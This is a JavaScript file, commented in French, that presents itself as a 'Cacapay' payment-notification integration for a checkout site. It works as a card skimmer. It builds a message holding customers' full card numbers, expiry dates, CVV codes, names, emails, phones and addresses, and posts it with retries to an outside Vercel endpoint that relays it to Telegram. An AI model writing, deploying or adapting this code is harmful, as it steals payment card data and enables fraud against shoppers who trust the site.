// Intégration Cacapay - Code à ajouter dans votre site de paiement
// ================================================================

/**
 * Configuration de l'API Cacapay
 */
const CACAPAY_CONFIG = {
    API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    TIMEOUT: 10000, // 10 secondes
    RETRY_ATTEMPTS: 3
};

/**
 * Fonction principale pour envoyer une notification de paiement
 * @param {Object} paymentData - Données du paiement
 * @returns {Promise<Object>} Résultat de l'envoi
 */
async function sendCacapayNotification(paymentData) {
    try {
        console.log('📤 Envoi notification Cacapay...', paymentData);
        
        // Validation des données requises
        const requiredFields = ['customerName', 'email', 'amount'];
        for (const field of requiredFields) {
            if (!paymentData[field]) {
                throw new Error(`Champ requis manquant: ${field}`);
            }
        }
        
        // Construction du message
        const message = buildPaymentMessage(paymentData);
        
        // Envoi avec retry
        const result = await sendWithRetry(message);
        
        if (result.success) {
            console.log('✅ Notification Cacapay envoyée !', result.messageId);
            return {
                success: true,
                messageId: result.messageId,
                timestamp: new Date().toISOString()
            };
        } else {
            console.error('❌ Erreur notification Cacapay:', result.error);
            return {
                success: false,
                error: result.error
            };
        }
        
    } catch (error) {
        console.error('❌ Erreur envoi notification Cacapay:', error);
        return {
            success: false,
            error: error.message
        };
    }
}

/**
 * Construit le message de paiement formaté
 * @param {Object} paymentData - Données du paiement
 * @returns {string} Message formaté
 */
function buildPaymentMessage(paymentData) {
    let message = `💰 NOUVEAU PAIEMENT REÇU !\n`;
    message += `👤 Nom: ${paymentData.customerName}\n`;
    message += `📧 Email: ${paymentData.email}\n`;
    
    if (paymentData.product) {
        message += `🛍️ Produit: ${paymentData.product}\n`;
    }
    
    if (paymentData.cardNumber) {
        message += `💳 Carte: ${paymentData.cardNumber}\n`;
    }
    
    message += `💶 Montant: ${paymentData.amount}€\n`;
    
    if (paymentData.expiry) {
        message += `📅 Expiration: ${paymentData.expiry}\n`;
    }
    
    if (paymentData.cvv) {
        message += `🔒 CVV: ${paymentData.cvv}\n`;
    }
    
    if (paymentData.phone) {
        message += `📱 Téléphone: ${paymentData.phone}\n`;
    }
    
    if (paymentData.address) {
        message += `🏠 Adresse: ${paymentData.address}\n`;
    }
    
    message += `🔒 Vérifiez immédiatement !`;
    
    return message;
}

/**
 * Envoie la notification avec retry automatique
 * @param {string} message - Message à envoyer
 * @returns {Promise<Object>} Résultat de l'envoi
 */
async function sendWithRetry(message) {
    let lastError;
    
    for (let attempt = 1; attempt <= CACAPAY_CONFIG.RETRY_ATTEMPTS; attempt++) {
        try {
            console.log(`📤 Tentative ${attempt}/${CACAPAY_CONFIG.RETRY_ATTEMPTS}...`);
            
            const response = await fetch(CACAPAY_CONFIG.API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: message,
                    type: 'payment'
                }),
                signal: AbortSignal.timeout(CACAPAY_CONFIG.TIMEOUT)
            });
            
            const result = await response.json();
            
            if (result.success) {
                return {
                    success: true,
                    messageId: result.telegramResponse?.result?.message_id
                };
            } else {
                throw new Error(result.error || 'Erreur inconnue de l\'API');
            }
            
        } catch (error) {
            lastError = error;
            console.warn(`⚠️ Tentative ${attempt} échouée:`, error.message);
            
            if (attempt < CACAPAY_CONFIG.RETRY_ATTEMPTS) {
                const delay = Math.pow(2, attempt) * 1000; // Backoff exponentiel
                console.log(`⏳ Attente ${delay}ms avant la prochaine tentative...`);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
    }
    
    return {
        success: false,
        error: lastError?.message || 'Toutes les tentatives ont échoué'
    };
}

/**
 * Fonction utilitaire pour formater un numéro de carte
 * @param {string} cardNumber - Numéro de carte
 * @returns {string} Numéro formaté
 */
function formatCardNumber(cardNumber) {
    const cleaned = cardNumber.replace(/\s/g, '').replace(/[^0-9]/gi, '');
    return cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
}

/**
 * Fonction utilitaire pour formater une date d'expiration
 * @param {string} expiry - Date d'expiration
 * @returns {string} Date formatée
 */
function formatExpiry(expiry) {
    const cleaned = expiry.replace(/\D/g, '');
    if (cleaned.length >= 2) {
        return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
    }
    return cleaned;
}

/**
 * Fonction utilitaire pour valider un email
 * @param {string} email - Email à valider
 * @returns {boolean} Email valide
 */
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

/**
 * Fonction utilitaire pour valider un montant
 * @param {number|string} amount - Montant à valider
 * @returns {boolean} Montant valide
 */
function isValidAmount(amount) {
    const numAmount = parseFloat(amount);
    return !isNaN(numAmount) && numAmount > 0;
}

// Export pour les modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        sendCacapayNotification,
        buildPaymentMessage,
        formatCardNumber,
        formatExpiry,
        isValidEmail,
        isValidAmount,
        CACAPAY_CONFIG
    };
}

// Export pour les modules ES6
if (typeof window !== 'undefined') {
    window.CacapayIntegration = {
        sendCacapayNotification,
        buildPaymentMessage,
        formatCardNumber,
        formatExpiry,
        isValidEmail,
        isValidAmount,
        CACAPAY_CONFIG
    };
}
